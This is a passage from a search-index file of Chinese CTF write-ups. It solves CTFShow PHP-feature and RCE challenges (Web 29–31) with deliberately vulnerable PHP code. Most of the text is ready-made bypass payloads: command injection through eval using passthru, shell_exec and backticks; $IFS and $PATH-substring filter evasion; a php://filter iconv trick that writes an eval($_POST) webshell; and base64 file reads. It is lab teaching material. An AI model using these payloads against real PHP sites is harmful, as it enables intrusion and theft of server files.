\u7ed5\u8fc7","text":"<p>\u8fd9\u4e24\u4e2a\u51fd\u6570\u4e00\u8d77\u68c0\u6d4b\u65f6\uff0c<code>is_numeric</code>\u8ba4\u4e3a\u5185\u5bb9\u91cc\u6709 %09 %0a %0b %0c %0d %20 \u4e5f\u7b97\u6570\u5b57\uff0c\u8ddf trim \u4e00\u8d77\u6d4b\u8bd5\u4e00\u4e0b</p> PHP<pre><code>for ($i = 0; $i &lt;= 128; $i++) {\n    $x = chr($i) . '1';\n    if (trim($x) !== '1' &amp;&amp;  is_numeric($x)) {\n        echo urlencode(chr($i)) . \"\\n\";\n    }\n}\n</code></pre> <p>\u9664\u4e86 +-. \u53f7\u4ee5\u5916\u8fd8\u6709\u53ea\u5269\u4e0b %0c \u4e5f\u5c31\u662f\u6362\u9875\u7b26\u4e86\uff0ctrim \u9ed8\u8ba4\u65f6\u6ca1\u6709\u5254\u9664 %0c\u3002\u5f62\u5982\u4ee5\u4e0b\u4ee3\u7801\u53ef\u4ee5\u7ed5\u8fc7</p> PHP<pre><code>if (is_numeric($num) and $num !== '36' and trim($num) !== '36') {\n    if ($num == '36') {\n        echo $flag;\n    } else {\n        echo \"hacker!!\";\n    }\n}\n</code></pre> <p>payload:<code>num=%0c36</code></p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#20-die","title":"20\u3001\u7ed5\u8fc7\u6b7b\u4ea1 die","text":"PHP<pre><code>&lt;?php\nfunction filter($x)\n{\n    if (preg_match('/http|https|utf|zlib|data|input|rot13|base64|string|log|sess/i', $x)) {\n        die('too young too simple sometimes naive!');\n    }\n}\n$file = $_GET['file'];\n$contents = $_POST['contents'];\nfilter($file);\nfile_put_contents($file, \"&lt;?php die();?&gt;\" . $contents);\n?&gt;\n</code></pre> <p>\u8fd9\u9053\u770b\u4e86\u7fbd\u5e08\u5085 wp\uff0c\u8fc7\u6ee4\u4e86\u8bb8\u591a\u534f\u8bae\uff0c\u8fd9\u662f\u53d6\u4e00\u4e2a UCS-2LE UCS-2BE</p> PHP<pre><code>payload:\nfile=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php\npost:contents=?&lt;hp pvela$(P_SO[T]1;)&gt;?\n</code></pre> <p>\u8fd9\u4f1a\u5c06\u5b57\u7b26\u4e24\u4f4d\u4e24\u4f4d\u4ea4\u6362\uff0cfile_put_contents \u5728\u5199\u5165\u7684\u65f6\u5019\u4f1a\u7834\u574f\u90a3\u53e5 die\uff0c\u4f46 contents \u90a3\u53e5\u6062\u590d\u539f\u8c8c\uff0c\u53ef\u4ee5\u6267\u884c</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#21-bash","title":"21\u3001\u901a\u8fc7\u5185\u7f6e bash \u547d\u4ee4\u6784\u9020\u547d\u4ee4","text":"<p>\u5728\u8bb8\u591a\u547d\u4ee4\u88ab\u8fc7\u6ee4\u65f6\uff0c\u53ef\u4ee5\u4e00\u4e2a\u5b57\u6bcd\u4e00\u4e2a\u5b57\u6bcd\u5f97\u6784\u9020\uff0c\u800c\u8fd9\u4e9b\u5b57\u6bcd\u4ece\u5185\u7f6e\u53d8\u91cf\u91cc\u9762\u622a\uff0c\u6bd4\u5982\u6784\u9020<code>nl</code>\uff0c\u53ef\u4ee5\u5199\u4e3a\u4e0b\u9762\u8fd9\u79cd\u65b9\u5f0f</p> <p><code>${PATH:14:1}${PATH:5:1}</code></p> <p>\u5728 linux \u4e2d\u53ef\u4ee5\u7528<code>~</code>\u83b7\u53d6\u53d8\u91cf\u7684\u6700\u540e\u51e0\u4f4d\uff0c\u4e5f\u53ef\u4ee5\u5199\u4e3a<code>${PATH:~0}${PWD:~0}</code>\uff0c\u5b57\u6bcd\u4e0e 0 \u4f5c\u7528\u4e00\u6837\uff0c<code>${PATH:~A}${PWD:~A}</code>\u4e5f\u662f nl\uff0cflag.php \u4e5f\u8fc7\u6ee4\u4e86\u7684\u8bdd\u53ef\u4ee5\u7528????.???\uff0c\u5177\u4f53\u60c5\u51b5\uff0c\u5177\u4f53\u5bf9\u5f85</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#22php","title":"22\u3001PHP \u53d8\u91cf\u540d\u975e\u6cd5\u5b57\u7b26","text":"<p>\u6bd4\u5982\u4f20\u5165 AA_BB.CC \u8fd9\u4e2a\u53d8\u91cf\uff0cPHP \u662f\u4e0d\u5141\u8bb8\u53d8\u91cf\u540d\u4e2d\u542b\u6709<code>.</code> \u7684\uff0c\u4f1a\u9ed8\u8ba4\u5c06\u4e0d\u5408\u6cd5\u5b57\u7b26\u66ff\u6362\u4e3a<code>_</code>, \u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php \nvar_dump($_POST);\n?&gt;         \n\u4f20\u503c\uff1aAA.BB.CC=14\n\u8f93\u51fa\uff1aarray(1) { [\"AA_BB_CC\"]=&gt; string(2) \"14\" }\n</code></pre> <p>\u4f46\u8f93\u5165<code>AA[BB.CC</code>\u5b83\u5c31\u53ea\u66ff\u6362 <code>[</code> \u8f93\u51fa array(1) { [\u201cAA_BB.CC\u201d]=&gt; string(2) \u201c14\u201d }</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#23gettext","title":"23\u3001gettext \u62d3\u5c55\u7684\u4f7f\u7528","text":"PHP<pre><code>var_dump(call_user_func($f1,$f2));\n</code></pre> <p>\u5982\u4ee5\u4e0a\u4ee3\u7801\uff0c\u591a\u91cd\u8fc7\u6ee4\u540e\uff0cf1 \u53ef\u4ee5\u4e3a<code>gettext</code>\uff0cf2 \u53ef\u4ee5\u4e3a<code>phpinfo</code>\uff0c\u5982\u679c\u8fc7\u6ee4\u66f4\u4e3a\u4e25\u683c\uff0c\u66f4\u6539 ini \u6587\u4ef6\u91cc\u7684\u62d3\u5c55\u540e\uff0c <code>_()</code> \u7b49\u6548\u4e8e <code>gettext()</code></p> PHP<pre><code>&lt;?php\necho gettext(\"phpinfo\");\n\u7ed3\u679c  phpinfo\n\necho _(\"phpinfo\");\n\u7ed3\u679c phpinfo\n</code></pre>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#24","title":"24\u3001\u6b63\u5219\u6700\u5927\u56de\u6eaf\u6b21\u6570\u7ed5\u8fc7","text":"<p>PHP \u4e3a\u4e86\u9632\u6b62\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff08reDOS\uff09\uff0c\u7ed9 pcre \u8bbe\u5b9a\u4e86\u4e00\u4e2a\u56de\u6eaf\u6b21\u6570\u4e0a\u9650 pcre.backtrack_limit \u56de\u6eaf\u6b21\u6570\u4e0a\u9650\u9ed8\u8ba4\u662f 100 \u4e07\u3002\u5982\u679c\u56de\u6eaf\u6b21\u6570\u8d85\u8fc7\u4e86 100 \u4e07\uff0cpreg_match \u5c06\u4e0d\u518d\u8fd4\u56de\u975e 1 \u548c 0\uff0c\u800c\u662f false\u3002</p> <p>\u4e5f\u5c31\u662f\u8bf4\u524d\u9762 100 \u4e07\u4e2a\u5b57\u6bcd\uff0c\u540e\u9762\u662f\u8bed\u53e5\u5c31\u597d\uff0c\u5982\u4e0b\u9762\u7684\u4f8b\u5b50</p> PHP<pre><code>&lt;?php\nif (preg_match('/.+?ABC/is', $f)) {\n    die('bye!');\n}\nif (stripos($f, 'ABC') === FALSE) {\n    die('bye!!');\n}\necho $flag;\n?&gt;\n</code></pre> <p>\u524d\u9762 100 \u4e07\u4e2a\u5b57\u6bcd\u540e\u9762 ABC \u5c31\u53ef\u4ee5 echo $flag</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#25","title":"25\u3001\u8c03\u7528\u7c7b\u4e2d\u7684\u51fd\u6570","text":"<p>-&gt; \u7528\u4e8e\u52a8\u6001\u8bed\u5883\u5904\u7406\u67d0\u4e2a\u7c7b\u7684\u67d0\u4e2a\u5b9e\u4f8b :: \u53ef\u4ee5\u8c03\u7528\u4e00\u4e2a\u9759\u6001\u7684\u3001\u4e0d\u4f9d\u8d56\u4e8e\u5176\u4ed6\u521d\u59cb\u5316\u7684\u7c7b\u65b9\u6cd5</p> <p>\u4e5f\u5c31\u662f\u8bf4\u53cc\u5192\u53f7\u4e0d\u7528\u5b9e\u4f8b\u5316\u7c7b\u5c31\u53ef\u4ee5\u8c03\u7528\u7c7b\u4e2d\u7684\u9759\u6001\u65b9\u6cd5</p> PHP<pre><code>&lt;?php\nclass ctfshow\n{\n    function __wakeup()\n    {\n        die(\"private class\");\n    }\n    static function getFlag()\n    {\n        echo file_get_contents(\"flag.php\");\n    }\n}\ncall_user_func($_POST['ctfshow']);\n?&gt;\n</code></pre> <p>\u8fd9\u4e2a\u4f20\u5165 ctfshow=ctfshow::getFlag \u5373\u53ef</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#26return","title":"26\u3001return \u7ed5\u8fc7","text":"<p><code>eval(\"return 1;phpinfo();\");</code>\u4f1a\u53d1\u73b0\u662f\u65e0\u6cd5\u6267\u884c phpinfo() \u7684\uff0c\u4f46\u662f php \u4e2d\u6709\u4e2a\u6709\u610f\u601d\u7684\u5730\u65b9\uff0c\u6570\u5b57\u662f\u53ef\u4ee5\u548c\u547d\u4ee4\u8fdb\u884c\u4e00\u4e9b\u8fd0\u7b97\u7684\uff0c\u4f8b\u5982 <code>1-phpinfo();</code>\u662f\u53ef\u4ee5\u6267\u884c phpinfo() \u547d\u4ee4\u7684\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-PHP%E7%89%B9%E6%80%A7/#_5","title":"\u53c2\u8003\uff1a","text":"<p>PHP\u7279\u6027\u603b\u7ed3</p> <p>ctf show-web\u5165\u95e8 php\u7279\u6027\u7bc7\u90e8\u5206\u9898\u89e3</p> <p>ctfshow-php\u7279\u6027-\u8d85\u8be6\u89e3(\u5e72\u8d27)</p> <p>ctfshow_web\u5165\u95e8 PHP\u7279\u6027</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/","title":"CTFshow RCE","text":"<p>\u9898\u76ee\u8303\u56f4\uff1aWeb29 - Web77 | Web118 - Web124</p> <p>\u53c2\u8003\uff1a\u547d\u4ee4\u6267\u884c\u7684\u89e3\u9898\u6280\u5de7</p> <p>\u53c2\u8003\uff1a\u65e0\u53c2\u6570\u8bfb\u6587\u4ef6\u548cRCE\u603b\u7ed3</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-29","title":"Web 29","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nerror_reporting(0);\nif(isset($_GET['c'])){\n    $c = $_GET['c'];\n    if(!preg_match(\"/flag/i\", $c)){\n        eval($c);\n    }\n}else{\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre> <p>\u9996\u5148\u5148\u8bf4\u4e00\u4e2a\u6ce8\u610f\u70b9\uff1a<code>?c=system('ls');</code>\u4e00\u5b9a\u4e0d\u8981\u5c11\u4e86\u540e\u9762\u7684\u5206\u53f7\uff0ceval\u5185\u6267\u884c\u7684\u662fphp\u4ee3\u7801\uff0c\u5fc5\u987b\u4ee5\u5206\u53f7\u7ed3\u5c3e</p> <p>\u6709\u4e00\u4e2aLinux\u547d\u4ee4\uff1a<code>tac</code>\uff0c\u4e5f\u5c31\u662f\u53cd\u5411\u7684cat\uff0c\u4f5c\u7528\u4e5f\u662f\u53cd\u5411\u8f93\u51fa\u5185\u5bb9\uff0c\u4f46\u662f\u4e0d\u77e5\u9053\u4e3a\u4ec0\u4e48\uff0c\u8fd9\u4e2a\u9898\u91cc\u9762\u4f7f\u7528cat\u663e\u793a\u4e0d\u51fa\u4efb\u4f55\u5185\u5bb9\uff0c\u4f46\u662ftac\u5c31\u53ef\u4ee5\u3002</p> <p>\u7ed5\u8fc7cat\u4f7f\u7528<code>tac more less head tac tail nl od(\u4e8c\u8fdb\u5236\u67e5\u770b) vi vim sort uniq</code></p> <p>\u539f\u56e0\uff1a<code>?c=system(\"cat fla*.php\");</code>\u9875\u9762\u4e0d\u4f1a\u76f4\u63a5\u663e\u793aflag\uff0c\u53ef\u4ee5\u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801\u83b7\u53d6flag\uff0c\u6216\u8005\uff1a<code>c=system(\"cat fla*.php|tac\");</code>  \u6ca1\u4ec0\u4e48\u610f\u4e49\u5c31\u662f\u4e86\uff0c</p> <p>\u89e3\u91ca\uff1a</p> <ol> <li> <p><code>cat fla*.php</code>: \u8fd9\u90e8\u5206\u547d\u4ee4\u4f7f\u7528<code>cat</code>\u547d\u4ee4\u6765\u5c06\u4ee5<code>fla</code>\u5f00\u5934\u4e14\u4ee5<code>.php</code>\u7ed3\u5c3e\u7684\u6240\u6709\u6587\u4ef6\u5185\u5bb9\u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\uff08\u901a\u5e38\u662f\u663e\u793a\u5728\u7ec8\u7aef\u4e0a\uff09\u3002</p> </li> <li> <p><code>|</code>: \u8fd9\u662f\u4e00\u4e2a\u7ba1\u9053\u7b26\u53f7\uff0c\u5b83\u5c06<code>cat</code>\u547d\u4ee4\u7684\u8f93\u51fa\u4f5c\u4e3a<code>|</code>\u540e\u9762\u547d\u4ee4\u7684\u8f93\u5165\u3002</p> </li> <li> <p><code>tac</code>: \u8fd9\u4e2a\u547d\u4ee4\u662f<code>cat</code>\u7684\u9006\u5e8f\uff0c\u5b83\u4f1a\u5c06\u8f93\u5165\u7684\u6587\u672c\u9006\u5e8f\u8f93\u51fa\u3002 </p> </li> </ol> <p>\u56e0\u4e3a\u53ea\u8fc7\u6ee4\u4e86\u201cflag\u201d\u3002</p> <p>\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\uff1a<code>?c=system(\"tac fla*.php\");</code></p> <p>\u6216\u8005\uff1a<code>?c=eval($_GET[\"code\"]);&amp;code=system(\"tac flag.php\");</code></p> <p>\u6216\u8005\uff1a<code>c=system(\"cp fl*g.php a.txt\");</code>\u7136\u540e\u8bbf\u95ee/a.txt</p> <p>\u6216\u8005\uff1a<code>?c=highlight_file(next(array_reverse(scandir(\".\"))));</code></p> <p>\u5173\u4e8e\u4e3a\u4ec0\u4e48\u8981\u5012\u8f6c\u6570\u7ec4\uff0c\u662f\u56e0\u4e3a\u5f53\u904d\u5386\u76ee\u5f55\u7684\u65f6\u5019\uff0c\u6570\u7ec4\u7684\u7b2c\u4e00\u4e2a\u662f\u201c.\u201d\uff0c\u7b2c\u4e8c\u4e2a\u662f\u201c..\u201d\uff0c\u7136\u540e\u662f\u9690\u85cf\u6587\u4ef6\uff08\u6587\u4ef6\u540d\u79f0\u4ee5.\u5f00\u5934\uff09\uff0c\u6700\u540e\u624d\u662f\u6211\u4eec\u8981\u7684\u6587\u4ef6\uff0c\u6240\u4ee5\u5230\u5012\u8f6c\u8fc7\u6765\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u4e00\u76f4next\u518dnext\u518d\u2026\u2026\u4e5f\u884c\uff0c\u4f46\u662f\u8fd9\u5c31\u4f1a\u5f88\u9ebb\u70e6\uff08\u4e0d\u77e5\u9053\u8981\u8bd5\u5230\u7b2c\u51e0\u4e2a\u624d\u884c\uff09</p> <p>\u89e3\u91ca\uff1a</p> <p>\u8fd9\u884c\u4ee3\u7801\u662fPHP\u4e2d\u7684\u4e00\u884c\u4ee3\u7801\uff0c\u5b83\u6709\u51e0\u4e2a\u90e8\u5206\u6784\u6210\uff1a</p> <ol> <li><code>scandir(\".\")</code>: \u8fd9\u4e2a\u51fd\u6570\u4f1a\u5217\u51fa\u5f53\u524d\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u6587\u4ef6\u548c\u76ee\u5f55\uff0c\u5e76\u8fd4\u56de\u4e00\u4e2a\u6570\u7ec4\uff0c\u6570\u7ec4\u7684\u6bcf\u4e2a\u5143\u7d20\u90fd\u662f\u5f53\u524d\u76ee\u5f55\u4e2d\u7684\u4e00\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55\u540d\u3002</li> </ol> <p>\u5f53\u4f60\u5c06 \".\" \u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9\u65f6\uff0c\u5b83\u5c06\u8fd4\u56de\u5f53\u524d\u76ee\u5f55\u4e2d\u7684\u6587\u4ef6\u7684\u540d\u79f0\u5217\u8868\u3002\u4f8b\u5982\uff0c\u5982\u679c\u5f53\u524d\u76ee\u5f55\u4e2d\u6709\u6587\u4ef6 \u201cfile1.txt\u201d \u548c \u201cfile2.txt\u201d\uff0c\u90a3\u4e48\u5c06\u8fd4\u56de\u6570\u7ec4 \u3002<code>scandir()``scandir(\".\")[\"file1.txt\", \"file2.txt\"]</code></p> <ol> <li> <p><code>array_reverse()</code>: \u8fd9\u4e2a\u51fd\u6570\u4f1a\u5c06\u6570\u7ec4\u4e2d\u7684\u5143\u7d20\u987a\u5e8f\u98a0\u5012\uff0c\u5373\u53cd\u8f6c\u6570\u7ec4\u3002</p> </li> <li> <p><code>next()</code>: \u8fd9\u4e2a\u51fd\u6570\u8fd4\u56de\u6570\u7ec4\u4e2d\u5f53\u524d\u6307\u9488\u6240\u5728\u5143\u7d20\u7684\u4e0b\u4e00\u4e2a\u5143\u7d20\uff0c\u5e76\u5c06\u6570\u7ec4\u6307\u9488\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\u3002</p> </li> <li> <p><code>highlight_file()</code>: \u8fd9\u4e2a\u51fd\u6570\u4f1a\u5c06\u6307\u5b9a\u6587\u4ef6\u7684\u5185\u5bb9\u4ee5HTML\u683c\u5f0f\u9ad8\u4eae\u663e\u793a\uff0c\u5e76\u8f93\u51fa\u5230\u6d4f\u89c8\u5668\u6216\u6807\u51c6\u8f93\u51fa\u3002</p> </li> </ol> <p>\u56e0\u6b64\uff0c\u6574\u4e2a\u4ee3\u7801\u7684\u4f5c\u7528\u662f\u4ece\u5f53\u524d\u76ee\u5f55\u4e2d\u83b7\u53d6\u6240\u6709\u6587\u4ef6\u548c\u76ee\u5f55\u540d\uff0c\u7136\u540e\u5c06\u8fd9\u4e2a\u6570\u7ec4\u53cd\u8f6c\uff0c\u5e76\u4ece\u53cd\u8f6c\u540e\u7684\u6570\u7ec4\u4e2d\u53d6\u51fa\u4e0b\u4e00\u4e2a\u6587\u4ef6\u540d\uff0c\u7136\u540e\u5c06\u8be5\u6587\u4ef6\u7684\u5185\u5bb9\u4ee5HTML\u683c\u5f0f\u9ad8\u4eae\u663e\u793a\u8f93\u51fa\u3002</p> <p>\u540c\u65f6\u8fd8\u6709show_source()\u51fd\u6570\uff0c\u8be5\u51fd\u6570\u548chighlight_file()\u51fd\u6570\u529f\u80fd\u5dee\u4e0d\u591a\uff0c\u88ab\u8fc7\u6ee4\u65f6\u4e5f\u53ef\u4ee5\u66ff\u6362\u4e3a\u8fd9\u4e2a\u8bd5\u8bd5\u3002</p> <p>\u6216\u8005 \u5229\u7528\u53c2\u6570\u8f93\u5165+eval\uff1a<code>?c=eval($_GET[1]);&amp;1=phpinfo();</code></p> <p>\u6216\u8005 \u5229\u7528\u53c2\u6570\u8f93\u5165+include\uff1a<code>?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</code></p> <p>\u89e3\u91ca\uff1a</p> <p>\u5b83\u8bd5\u56fe\u5305\u542b\u4e00\u4e2a\u901a\u8fc7GET\u8bf7\u6c42\u4f20\u9012\u7684\u53c2\u6570\u3002</p> <ol> <li> <p><code>include $_GET[1]</code>: \u8fd9\u90e8\u5206\u4ee3\u7801\u8bd5\u56fe\u5305\u542b\u901a\u8fc7GET\u8bf7\u6c42\u4f20\u9012\u7684\u53c2\u6570\u6240\u6307\u5b9a\u7684\u6587\u4ef6\u3002<code>$_GET[1]</code>\u662f\u4eceGET\u8bf7\u6c42\u4e2d\u83b7\u53d6\u540d\u4e3a<code>1</code>\u7684\u53c2\u6570\u7684\u503c\uff0c\u7136\u540e<code>include</code>\u8bed\u53e5\u4f1a\u5c1d\u8bd5\u5c06\u8fd9\u4e2a\u503c\u4f5c\u4e3a\u6587\u4ef6\u540d\u5305\u542b\u8fdb\u6765\u3002</p> </li> <li> <p><code>1=php://filter/read=convert.base64-encode/resource=flag.php</code>: \u8fd9\u90e8\u5206\u662fGET\u8bf7\u6c42\u4e2d\u7684\u53c2\u6570\u5b57\u7b26\u4e32\u3002\u5b83\u7684\u4f5c\u7528\u662f\u4f7f\u7528PHP\u7684\u8fc7\u6ee4\u5668\uff08filters\uff09\u529f\u80fd\uff0c\u5c06<code>flag.php</code>\u6587\u4ef6\u7684\u5185\u5bb9\u4ee5Base64\u7f16\u7801\u7684\u5f62\u5f0f\u8bfb\u53d6\u5e76\u4f20\u9012\u7ed9<code>include</code>\u8bed\u53e5\u3002\u5177\u4f53\u6765\u8bf4\uff1a</p> </li> <li><code>php://filter/read=convert.base64-encode/resource=flag.php</code>\u90e8\u5206\u662f\u4e00\u4e2aPHP\u8fc7\u6ee4\u5668\uff0c\u5b83\u5c06<code>flag.php</code>\u6587\u4ef6\u7684\u5185\u5bb9\u8bfb\u53d6\uff0c\u5e76\u5bf9\u5176\u8fdb\u884cBase64\u7f16\u7801\u3002</li> <li><code>1=</code>\u8fd9\u4e00\u90e8\u5206\u662f\u53c2\u6570\u540d\uff0c\u544a\u8bc9PHP\u5c06\u6b64\u503c\u8d4b\u7ed9<code>$_GET[1]</code>\u3002</li> </ol> <p>\u603b\u4f53\u6765\u8bf4\uff0c\u8fd9\u884c\u4ee3\u7801\u7684\u76ee\u7684\u662f\u4ece\u670d\u52a1\u5668\u6587\u4ef6\u7cfb\u7edf\u4e2d\u8bfb\u53d6<code>flag.php</code>\u6587\u4ef6\u7684\u5185\u5bb9\uff0c\u5e76\u4ee5Base64\u7f16\u7801\u7684\u5f62\u5f0f\u8f93\u51fa\u5230\u5ba2\u6237\u7aef\u3002</p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-30-system","title":"Web 30 system\u8fc7\u6ee4","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nerror_reporting(0);\n\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    if (!preg_match(\"/flag|system|php/i\", $c)) {\n        eval($c);\n    }\n} else {\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre> <p>\u5176\u4e2d\u8fc7\u6ee4\u7684flag\u548cphp\u4ecd\u7136\u53ef\u4ee5\u4f7f\u7528\u901a\u914d\u7b26 * \u6216 ?  \u6a21\u7cca\u5339\u914d\u7ed5\u8fc7\u3002\u81f3\u4e8esystem\uff0c\u53ef\u4ee5\u4f7f\u7528<code>exec</code>\uff0c<code>shell_exec</code>\uff0c\u53cd\u5f15\u53f7\u3010<code>$command</code>\u3011\uff0c<code>passthru</code>\u7ed5\u8fc7\uff0c\u6ce8\u610fexec\u548cshell_exec\u9700\u8981\u8f93\u51fa\u547d\u4ee4\u6267\u884c\u7ed3\u679c\uff0c\u5176\u4e2d\u7684exec\uff0c\u5b83\u7684\u8fd4\u56de\u5b57\u7b26\u4e32\u53ea\u662f\u5916\u90e8\u7a0b\u5e8f\u6267\u884c\u540e\u8fd4\u56de\u7684\u6700\u540e\u4e00\u884c\uff1b\u82e5\u9700\u8981\u5b8c\u6574\u7684\u8fd4\u56de\u5b57\u7b26\u4e32\uff0c\u53ef\u4ee5\u4f7f\u7528 PassThru() \u8fd9\u4e2a\u51fd\u6570\u3002</p> <p>passthru\uff1a</p> <p><code>?c=passthru(\"ls\");</code></p> <p><code>?c=passthru(\"tac fla*\");</code></p> <p>\u53cd\u5f15\u53f7\uff1a</p> Text Only<pre><code>?c=echo `ls`;\n?c=echo `tac fla*`;\n</code></pre> <p>shell_exec\uff1a</p> <p><code>?c=echo shell_exec(\"ls\");</code></p> <p><code>?c=echo shell_exec(\"nl fla*|tac\");</code></p> <p>eval\u7ed5\u8fc7\uff1a</p> <p><code>?c=eval($_GET[\"code\"]);&amp;code=system(\"tac flag.php\");</code></p> <p><code>?c=eval($_GET[1]);&amp;1=phpinfo();</code></p> <p><code>?c=eval($_GET[1]);&amp;1=system(\"tac%20flag.php\");</code></p> <p>\u6ce8\u610f\uff1a\u62fc\u63a5\u6cd5<code>?c=$a=sys;$b=tem;$d=$a.$b;$d(\"tac fl*\");</code>\uff08\u8fd9\u65b9\u6cd5\u4e5f\u662f\u6ca1\u8c01\u4e86\uff09</p> <p>\u4e00\u4e2alinux\u547d\u4ee4\uff1a</p> <p>\u6253\u5370\u6587\u4ef6\u547d\u4ee4 echo nl  file\uff0c\u8fd9\u4e2a\u547d\u4ee4\u8c8c\u4f3c\u53ef\u4ee5\u5728cat\u3001tac\u88ab\u8fc7\u6ee4\u7684\u65f6\u5019\u4f7f\u7528\u3002</p> <p>PHP\u77ed\u6807\u7b7e\uff1a<code>&lt;?=system('ls')?&gt;</code></p>"},{"location":"WEB/CTFShow/CTFShow-RCE/#web-31","title":"Web 31","text":"<p>\u4ee3\u7801\u5982\u4e0b\uff1a</p> PHP<pre><code>&lt;?php\nerror_reporting(0);\n\nif (isset($_GET['c'])) {\n    $c = $_GET['c'];\n    if (!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)) {\n        eval($c);\n    }\n} else {\n    highlight_file(__FILE__);\n}\n?&gt;\n</code></pre> <p>\u654f\u611f\u8bcd\uff1a \"flag\"\u3001\"system\"\u3001\"php\"\u3001\"cat\"\u3001\"sort\"\u3001\"shell\"\u3001\".\"\u3001\" \"\u3001\"'\"\uff08\u7a7a\u683c\u548c\u5355\u5f15\u53f7\uff09\u3002</p> <p>\u6211\u4eec\u4e00\u4e2a\u4e00\u4e2a\u770b\uff1a</p> <ol> <li>flag\uff0c\u8fd9\u4e2a\u5c31\u7528\u901a\u914d\u7b26\u5c31\u884c</li> <li>system\uff0cWeb 30\u4e2d\u5df2\u7ecf\u89e3\u51b3\u4e86</li> <li>cat\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528\u201ctac\u3001nl\u3001cp\u201d\u7b49</li> <li>\u7a7a\u683c\uff0c<code>%09</code>\u3001<code>${IFS}</code>\u3001<code>$IFS$9</code>\uff08<code>\\$IFS\\$9</code>\u8f6c\u4e49\uff09\u90fd\u53ef\u4ee5</li> </ol> <p>\u89e3\u9898\uff1a</p> <p>\u6700\u7b80\u5355\u7684\uff1a</p> <p><code>?c=passthru(\"ls\");</code></p> <p><code>?c=passthru(\"tac%09fla*\");</code></p> <p>\u8fd8\u6709\uff1a</p> <p><code>?c=passthru(%22tac\\$IFS\\$9fla*%22);</code>\u4e5f\u5c31\u662f<code>passthru(\"tac\\$IFS\\$9fla*\");</code>\uff08%22\u4e3a\u53cc\u5f15\u53f7\uff09</p> <p>\u4f7f\u7528pos(localeconv)\u6765\u83b7\u53d6\u5c0f\u6570\u70b9</p> <p>localeconv\u53ef\u4ee5\u8fd4\u56de\u5305\u62ec\u5c0f\u6570\u70b9\u5728\u5185\u7684\u4e00\u4e2a\u6570\u7ec4\uff1bpos\u53bb\u53d6\u51fa\u6570\u7ec4\u4e2d\u5f53\u524d\u7b2c\u4e00\u4e2a\u5143\u7d20\uff0c\u4e5f\u5c31\u662f\u5c0f\u6570\u70b9\u3002\u8fd9\u5c31\u7ed5\u8fc7\u4e86\u5c0f\u6570\u70b9\u9650\u5236\u3002</p> <p>current()\u51fd\u6570\u8fd4\u56de\u6570\u7ec4\u4e2d\u7684\u5f53\u524d\u5143\u7d20/\u5355\u5143\uff0c\u9ed8\u8ba4\u53d6\u7b2c\u4e00\u4e2a\u503c\uff1b</p> <p>pos()\u51fd\u6570\u540c\u4e0a\uff0c\u662fcurrent()\u51fd\u6570\u7684\u522b\u540d\uff1b</p> <p>reset()\u51fd\u6570\uff0c\u5f53\u6570\u7ec4\u4e0d\u4e3a\u7a7a\u65f6\u8fd4\u56de\u6570\u7ec4\u7b2c\u4e00\u4e2a\u5355\u5143\u7684\u503c\uff0c\u5982\u679c\u6570\u7ec4\u4e3a\u7a7a\u5219\u8fd4\u56deFALSE</p> <p><code>print_r(scandir(current(localeconv())));</code> <code>print_r(scandir(pos(localeconv())));</code> <code>print_r(scandir(reset(localeconv())));</code></p> <p>scandir\u53ef\u4ee5\u7ed3\u5408\u5b83\u626b\u63cf\u5f53\u524d\u76ee\u5f55\u5185\u5bb9\u3002<code>?c=print_r(scandir(pos(localeconv())));</code> \u53ef\u4ee5\u770b\u5230\u5f53\u524d\u76ee\u5f55\uff0c\u901a\u8fc7array_reverse\u628a\u6570\u7ec4\u9006\u5e8f\uff0c\u901a\u8fc7next\u53d6\u5230\u7b2c\u4e8c\u4e2a\u6570\u7ec4\u5143\u7d20\uff0c\u4e5f\u5373flag.php \u7136\u540e</p> <p><code>?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p> <p>\u6216\u8005\uff1a<code>c=show_source(next(array_reverse(scandir(getcwd()))));</code></p> <p>\u8fd9\u4e2a\u5728Web 29\u6709\u8be6\u7ec6\u89e3\u91ca\uff0c\u8fd9\u91cc\u5c31\u662f\u5728Web 29\u7684\u57fa\u7840\u4e0a\u7ed5\u8fc7\u4e86\u5c0f\u6570\u70b9\u3002</p> 